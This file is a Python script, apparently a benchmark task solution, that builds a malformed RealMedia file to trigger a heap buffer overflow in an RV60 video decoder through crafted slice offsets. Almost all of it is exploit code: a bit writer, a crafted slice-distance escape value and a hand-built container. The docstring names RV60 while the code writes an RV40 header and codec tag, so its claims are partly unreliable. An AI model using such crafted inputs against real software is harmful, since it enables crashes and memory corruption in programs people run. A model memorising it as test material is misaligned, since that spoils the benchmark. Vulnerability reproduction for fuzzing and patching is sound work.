import struct

class BitStream:
    """A helper class to write bitstreams."""
    def __init__(self):
        self.data = bytearray()
        self.bits = 0
        self.bit_count = 0

    def write(self, val: int, n_bits: int):
        """Writes n_bits from val to the stream."""
        for i in range(n_bits - 1, -1, -1):
            bit = (val >> i) & 1
            self.bits = (self.bits << 1) | bit
            self.bit_count += 1
            if self.bit_count == 8:
                self.data.append(self.bits)
                self.bits = 0
                self.bit_count = 0

    def get_bytes(self) -> bytes:
        """Returns the byte representation of the stream, flushing any remaining bits."""
        final_data = self.data[:]
        if self.bit_count > 0:
            final_data.append(self.bits << (8 - self.bit_count))
        return bytes(final_data)

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generates a Proof-of-Concept (PoC) input that triggers a heap buffer
        overflow in the RV60 decoder.

        The vulnerability exists in how slice offsets are handled. The decoder calculates
        slice sizes from an array of offsets read from the bitstream. It's possible to
        craft these offsets such that a calculated slice size, when added to its start
        offset, extends beyond the actual packet buffer. The `init_get_bits` function
        is then called with this oversized value, leading to subsequent out-of-bounds
        reads when the slice is decoded.

        This PoC constructs a minimal RealMedia (.rm) file containing a single video
        packet. This packet is crafted to:
        1. Set the number of slices to 2.
        2. Encode a very large value for the distance to the second slice's offset
           using a VLC escape code.
        3. Make the overall packet buffer very small.

        This combination ensures that the calculated end offset of the first slice
        (start_offset + large_distance) is greater than the small packet buffer size,
        triggering the heap buffer overflow.
        """
        
        # 1. Craft the malicious video packet payload.
        bs = BitStream()

        # Picture Header (34 bits) for RV40, configured to have 2 slices.
        # The number of slices is derived from the last 4 bits of the header.
        # num_slices = ((nsa << 2) | nsb) + 1. To get 2, (nsa<<2)|nsb must be 1.
        bs.write(0, 2)   # ptype
        bs.write(0, 1)   # field_2_4
        bs.write(0, 8)   # field_3_5
        bs.write(0, 1)   # field_4_1
        bs.write(0, 13)  # pic_id
        bs.write(0, 1)   # pquant
        bs.write(0, 2)   # field_7_3
        bs.write(0, 1)   # deblocking
        bs.write(0, 1)   # slice_size_flag (0 to use offsets)
        bs.write(0, 2)   # num_slices_minus1_a = 0
        bs.write(1, 2)   # num_slices_minus1_b = 1 -> num_slices = 2

        # Slice distance VLC (12 bits) to create an extremely large offset.
        # The VLC table for slice distances uses an escape mechanism. A 9-bit
        # code of all 1s (511) is an escape, followed by 3 more bits whose
        # value is added to 511. We encode the maximum possible value: 511 + 7 = 518.
        bs.write(0b111111111, 9)  # Escape code for 511
        bs.write(0b111, 3)        # Value to add (7)

        payload_core = bs.get_bytes()
        
        # The total packet buffer size must be small for the overflow to occur.
        # The header size up to this point is ceil(46 bits / 8) = 6 bytes.
        # The decoded slice distance is 518.
        # The vulnerability is triggered if: header_size + distance > buf_size
        # i.e., 6 + 518 > buf_size. We choose a small buf_size of 8.
        buf_size = 8
        payload = payload_core.ljust(buf_size, b'\x00')

        # 2. Construct a minimal RealMedia (.rm) file container.
        
        # .RMF header (14 bytes)
        rmf_header = b'.RMF'
        rmf_header += struct.pack('>I', 14)  # header_size
        rmf_header += struct.pack('>H', 0)   # file_version
        rmf_header += struct.pack('>I', 3)   # num_headers (PROP, MDPR, DATA)

        # PROP header (38 bytes)
        prop_header = b'PROP'
        prop_header += struct.pack('>I', 38)
        prop_header += struct.pack('>H', 0)
        prop_header += b'\x00' * 30

        # MDPR (Media Properties) header
        type_specific_data = b'vidcRV40' + struct.pack('>HHHH', 0, 320, 240, 12) + b'\x02\x00\x00\x00'
        
        mdpr_body = b''
        mdpr_body += struct.pack('>H', 0)
        mdpr_body += struct.pack('>H', 0)
        mdpr_body += struct.pack('>I', 1024)
        mdpr_body += struct.pack('>I', 0)
        mdpr_body += struct.pack('B', 0)
        mdpr_body += struct.pack('B', 0)
        mdpr_body += struct.pack('>I', len(type_specific_data))
        mdpr_body += type_specific_data

        mdpr_size = 8 + len(mdpr_body)
        mdpr_header = b'MDPR' + struct.pack('>I', mdpr_size) + mdpr_body
        
        # DATA header containing the single malicious packet
        packet_header = struct.pack('>BHHIB',
                                    0, len(payload), 0, 0, 2)

        packets_data = packet_header + payload
        
        data_body = b''
        data_body += struct.pack('>I', 0)
        data_body += struct.pack('>I', 1)
        data_body += struct.pack('>I', 0)
        data_body += packets_data

        data_size = 8 + len(data_body)
        data_header = b'DATA' + struct.pack('>I', data_size) + data_body
        
        poc = rmf_header + prop_header + mdpr_header + data_header
        
        return poc